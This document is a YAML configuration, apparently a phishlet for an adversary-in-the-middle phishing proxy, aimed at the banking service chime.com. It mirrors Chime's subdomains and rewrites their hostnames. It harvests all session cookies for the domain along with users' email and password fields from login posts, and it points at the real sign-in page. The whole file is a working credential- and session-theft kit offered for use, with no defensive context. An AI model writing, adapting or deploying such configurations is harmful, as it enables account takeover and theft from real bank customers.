author: '@longwu'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'chime.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'chime.com', session: true, is_landing: false}
  - {phish_sub: 'nd', orig_sub: 'nd', domain: 'chime.com', session: true, is_landing: false}
  - {phish_sub: 'member', orig_sub: 'member', domain: 'chime.com', session: true, is_landing: false}


sub_filters:
  - {triggers_on: 'chime.com', orig_sub: '', domain: 'chime.com', search: '{hostname_regexp}/', replace: '{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.chime.com', orig_sub: 'www', domain: 'chime.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'nd.chime.com', orig_sub: 'nd', domain: 'chime.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'member.chime.com', orig_sub: 'member', domain: 'chime.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}

auth_tokens:
  - domain: '.chime.com'
    keys: ['.*,regexp']

auth_urls:
  - '/member/spending#/'
  - '/member/.*'

credentials:
  username:
    key: 'user[email]'
    search: '(.*)'
    type: 'post'
  password:
    key: 'user[password]'
    search: '(.*)'
    type: 'post'

force_post:
  - path: '/auth_p'
    search:
      - {key: 'user[email]', search: '.*'}
      - {key: 'user[password]', search: '.*'}
    type: 'post'

login:
  domain: 'member.chime.com'
  path: '/users/sign_in'
  
